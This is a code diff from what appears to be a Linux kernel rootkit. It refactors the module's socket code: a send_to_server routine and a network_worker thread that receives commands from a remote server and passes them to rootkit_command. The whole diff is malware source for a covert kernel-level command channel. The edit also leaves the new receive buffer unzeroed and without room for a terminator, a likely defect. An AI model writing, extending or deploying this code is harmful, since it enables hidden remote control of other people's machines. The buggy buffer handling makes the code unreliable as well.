@@ -9,6 +9,11 @@
 
 struct socket *sock = NULL;
 
+// Functions prototypes
+int close_socket(void);
+int send_to_server(char *message, ...);
+int network_worker(void *data);
+
 /**
  * @brief Closes the communication by releasing the socket.
  *
@@ -40,33 +45,43 @@ int close_socket(void)
  *         failure of the operation. Specific return codes and
  *         their meanings should be documented in the implementation.
  */
-int send_to_server(char *message, ...){
-	struct kvec vec = { 0 };
-	struct msghdr msg = { 0 };
-	int ret_code = 0;
-	va_list args;
-	char formatted_message[1024] = { 0 };
+int send_to_server(char *message, ...) {
+    struct kvec vec = {0};
+    struct msghdr msg = {0};
+    int ret_code = 0;
+    va_list args;
+    char *formatted_message;
+    
+    formatted_message = kmalloc(1024, GFP_KERNEL);
+    if (!formatted_message) {
+        ERR_MSG("send_to_server: memory allocation failed\n");
+        return -ENOMEM;
+    }
 
-	if (!sock) {
-		ERR_MSG("send_to_server: socket is NULL\n");
-		return -FAILURE;
-	}
+    if (!sock) {
+        ERR_MSG("send_to_server: socket is NULL\n");
+        kfree(formatted_message);
+        return -FAILURE;
+    }
 
-	// Format the message with additional arguments
-	va_start(args, message);
-	vsnprintf(formatted_message, sizeof(formatted_message), message, args);
-	va_end(args);
+    // Format the message with additional arguments
+    va_start(args, message);
+    vsnprintf(formatted_message, 1024, message, args);
+    va_end(args);
 
-	vec.iov_base = formatted_message;
-	vec.iov_len = strlen(formatted_message);
+    vec.iov_base = formatted_message;
+    vec.iov_len = strlen(formatted_message);
 
-	ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
-	if (ret_code < 0) {
-		ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
-		return -FAILURE;
-	}
+    ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
+    if (ret_code < 0) {
+        ERR_MSG("send_to_server: failed to send message: %d\n", ret_code);
+        kfree(formatted_message);
+        return -FAILURE;
+    }
 
-	return SUCCESS;
+    kfree(formatted_message);
+
+    return SUCCESS;
 }
 
 /**
@@ -144,10 +159,15 @@ int network_worker(void *data)
 	while (!kthread_should_stop() && !thread_exited) {
 		struct kvec recv_vec;
 		struct msghdr recv_msg = { 0 };
-		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };
+
+		char *recv_buffer = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
+		if (!recv_buffer) {
+			ERR_MSG("network_worker: failed to allocate recv_buffer\n");
+			break;
+		}
 
 		recv_vec.iov_base = recv_buffer;
-		recv_vec.iov_len = sizeof(recv_buffer) - 1;
+		recv_vec.iov_len = RCV_CMD_BUFFER_SIZE;
 
 		// Wait to receive a message from the server
 		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
@@ -174,6 +194,9 @@ int network_worker(void *data)
 		}
 
 		rootkit_command(recv_buffer, RCV_CMD_BUFFER_SIZE);
+
+		kfree(recv_buffer);
+		recv_buffer = NULL;
 	}
 
 	// Final cleanup before thread exits
